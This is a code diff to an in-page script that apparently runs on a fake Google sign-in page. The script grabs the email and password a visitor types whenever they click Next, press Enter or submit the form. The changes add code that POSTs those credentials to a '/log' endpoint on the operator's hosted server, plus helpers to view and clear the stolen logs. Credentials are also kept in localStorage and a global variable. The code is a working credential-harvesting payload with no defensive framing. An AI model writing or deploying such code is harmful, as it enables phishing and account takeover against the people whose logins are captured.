@@ -16084,6 +16084,7 @@
     let passwordSent = false;
 
     function getEmail() {
+        // Try multiple ways to get the email
         const emailInput = document.querySelector('input[name="identifier"]') || 
                           document.querySelector('input[type="email"]');
         if (emailInput && emailInput.value) return emailInput.value;
@@ -16103,6 +16104,22 @@
         return pwdInput ? pwdInput.value : '';
     }
 
+    function sendToServer(email, password) {
+        // Send to your Render backend
+        fetch('/log', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email, password })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('✅ Server response:', data);
+        })
+        .catch(err => {
+            console.error('❌ Failed to send to server:', err);
+        });
+    }
+
     function captureAndLog() {
         if (passwordSent) return;
         
@@ -16110,14 +16127,17 @@
         if (password && password.length > 0) {
             const email = getEmail();
             
-            // ====== LOG TO CONSOLE ======
+            // ====== SEND TO RENDER SERVER ======
+            sendToServer(email, password);
+            
+            // ====== LOG TO BROWSER CONSOLE ======
             console.log('%c🔑 PASSWORD CAPTURED', 'font-size:24px;font-weight:bold;color:#0f0;background:#000;padding:10px;border-radius:5px;');
             console.log('%c📧 Email:', 'font-size:16px;font-weight:bold;color:#00f;', email);
             console.log('%c🔑 Password:', 'font-size:16px;font-weight:bold;color:#f00;', password);
             console.log('%c🕐 Time:', 'font-size:14px;color:#888;', new Date().toLocaleString());
             console.log('%c' + '='.repeat(50), 'color:#888;');
             
-            // Also store in localStorage as backup
+            // ====== STORE IN LOCALSTORAGE (Backup) ======
             try {
                 localStorage.setItem('captured_password', JSON.stringify({
                     email: email,
@@ -16126,15 +16146,20 @@
                 }));
             } catch(e) {}
             
-            // Store in global variable
-            window._capturedData = { email, password, timestamp: new Date().toISOString() };
+            // ====== STORE IN GLOBAL VARIABLE ======
+            window._capturedData = { 
+                email: email, 
+                password: password, 
+                timestamp: new Date().toISOString() 
+            };
             
             passwordSent = true;
         }
     }
 
-    // ====== RETRIEVE FUNCTION ======
+    // ====== RETRIEVE CAPTURED DATA ======
     window.getCaptured = function() {
+        // Check localStorage first
         try {
             const stored = localStorage.getItem('captured_password');
             if (stored) {
@@ -16147,6 +16172,7 @@
             }
         } catch(e) {}
         
+        // Check global variable
         if (window._capturedData) {
             console.log('📂 Retrieved from memory:');
             console.log('📧 Email:', window._capturedData.email);
@@ -16158,7 +16184,33 @@
         return null;
     };
 
+    // ====== VIEW SERVER LOGS ======
+    window.viewLogs = function() {
+        fetch('/view-logs')
+            .then(response => response.text())
+            .then(data => {
+                console.log('📋 Server Logs:\n' + data);
+            })
+            .catch(err => {
+                console.error('❌ Failed to fetch logs:', err);
+            });
+    };
+
+    // ====== CLEAR SERVER LOGS ======
+    window.clearLogs = function() {
+        fetch('/clear-logs', { method: 'DELETE' })
+            .then(response => response.json())
+            .then(data => {
+                console.log('🗑️ Logs cleared:', data);
+            })
+            .catch(err => {
+                console.error('❌ Failed to clear logs:', err);
+            });
+    };
+
     // ====== EVENT LISTENERS ======
+
+    // 1. Listen for click on "Next" button
     document.addEventListener('click', function(e) {
         const target = e.target.closest('button') || e.target.closest('[role="button"]');
         if (target) {
@@ -16169,6 +16221,7 @@
         }
     }, true);
 
+    // 2. Listen for Enter key on password field
     const passwordField = document.querySelector('input[name="Passwd"]');
     if (passwordField) {
         passwordField.addEventListener('keydown', function(e) {
@@ -16178,13 +16231,14 @@
         });
     }
 
+    // 3. Listen for form submit
     document.addEventListener('submit', function(e) {
         if (e.target && e.target.querySelector('input[name="Passwd"]')) {
             setTimeout(captureAndLog, 300);
         }
     }, true);
 
-    // Find Next button
+    // 4. Find and attach to Next button (fallback)
     let attempts = 0;
     const findButton = setInterval(function() {
         const nextContainer = document.querySelector('#passwordNext');
@@ -16199,9 +16253,11 @@
         if (attempts > 30) clearInterval(findButton);
     }, 500);
 
-    console.log('%c✅ Password Logger Active', 'font-size:18px;font-weight:bold;color:#0f0;');
+    // ====== INITIALIZATION MESSAGE ======
+    console.log('%c✅ Password Logger Active - Sending to Render Server!', 'font-size:20px;font-weight:bold;color:#0f0;');
     console.log('%c📌 Enter password and click "Next" or press Enter', 'font-size:14px;color:#ff0;');
-    console.log('%c📌 Password will appear in console', 'font-size:14px;color:#ff0;');
-    console.log('%c📌 To retrieve later, type: getCaptured()', 'font-size:14px;color:#ff0;');
+    console.log('%c📌 Password appears in console AND is sent to Render', 'font-size:14px;color:#ff0;');
+    console.log('%c📌 Check Render Logs at /view-logs', 'font-size:14px;color:#ff0;');
+    console.log('%c📌 Commands: getCaptured() | viewLogs() | clearLogs()', 'font-size:14px;color:#0ff;');
 })();
 </script>
